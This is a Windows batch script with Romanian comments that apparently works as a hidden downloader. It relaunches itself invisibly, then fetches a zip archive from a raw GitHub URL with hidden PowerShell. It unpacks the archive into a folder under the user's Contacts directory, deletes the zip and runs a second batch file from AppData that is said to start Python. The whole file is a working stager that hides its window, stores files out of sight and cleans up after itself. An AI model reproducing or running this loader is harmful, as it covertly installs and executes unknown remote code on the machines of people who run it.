@echo off
if not "%~1"=="h" (
    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
    exit /b
)

set "site_url=https://raw.githubusercontent.com/MoViper2244/VIPER2/main/"
set "z=%TEMP%\zo.zip"
set "d=%USERPROFILE%\Contacts\zo"

:: Crează folderul dacă nu există
if not exist "%d%" mkdir "%d%"

:: Descarcă zo.zip
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%site_url%zo.zip' -OutFile '%z%'"

:: Dezarhivează
powershell -WindowStyle Hidden -Command "Expand-Archive '%z%' '%d%' -Force"

:: Șterge zip-ul
del "%z%" >nul 2>&1

:: Rulează file2.bat din %APPDATA% (care va rula Python)
if exist "%APPDATA%\file2.bat" (
    call "%APPDATA%\file2.bat"
)

exit /b 0
